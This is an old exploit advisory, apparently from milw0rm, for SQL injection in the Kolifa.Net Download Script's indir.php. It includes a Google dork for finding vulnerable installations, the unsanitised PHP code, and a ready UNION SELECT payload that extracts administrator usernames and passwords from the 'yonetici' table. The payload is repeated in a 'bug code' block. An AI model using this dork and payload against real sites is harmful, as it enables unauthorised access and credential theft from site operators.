@@ -1,0 +1,60 @@
+Title: Kolifa.Net Download Script (indir.php)
+
+================================================================
+
+[+] Author : Kacak
+
+[+] Special Thankz : Sa0 & Knock0ut & Biyocanlar & BilisimCanlar & All My Friends
+
+[+] BuqX [at] Hotmail [dot] Com
+
+[+] http://www.lmfrf.org/kolifanet-download-script-12-sql-injection-vulnerability/2008/08/26/web-script-bug/
+
+=================================================================
+
+Script : Kolifa.Net Download Script
+
+Demo : http://kolifadwn.awardspace.com/down
+
+Download : http://php.arsivimiz.com/indir.php?id=880
+
+Google Dork : inurl:prog.php?dwkodu=
+
+Error Code :  
+
+<?php
+//*****************************
+//*****************************
+//********** KOLİFA ***********
+//********** DOWNLOAD *********
+//********** SCRİPT ***********
+//*****************************
+//****** www.kolifa.net *******
+//*****************************
+ini_set('error_reporting', E_ALL^E_NOTICE);
+include("ayarlar.php");
+require('fonksiyon.php');
+$baglanti = mysql_connect($dbhost,$dbkullanici,$dbsifre) or die("Veritabanına bağlanılamadı.");
+$sec = mysql_select_db($db);
+$dwkodu=strip_tags($_GET['id']);
+$act=strip_tags($_GET['act']);
+?>
+
+---------------------------
+
+Example : http://[Site]/indir.php?id=-1/**/union/**/select/**/concat(admin_adi,0x3a,admin_sifresi)/**/from/**/yonetici/
+
+[<p>Eğer Yüklenme İşlemi Başlamazsa <a href="Username:Password">Buraya Tıklayın</a></td>]
+
+
+###############################################################
+
+< -- bug code start -- >
+
+www.site.com/path/indir.php?id=-1/**/union/**/select/**/concat(admin_adi,0x3a,admin_sifresi)/**/from/**/yonetici/*
+
+/path/indir.php?id=-1/**/union/**/select/**/concat(admin_adi,0x3a,admin_sifresi)/**/from/**/yonetici/*
+
+< -- bug code end of -- >
+
+# milw0rm.com [2008-08-26]
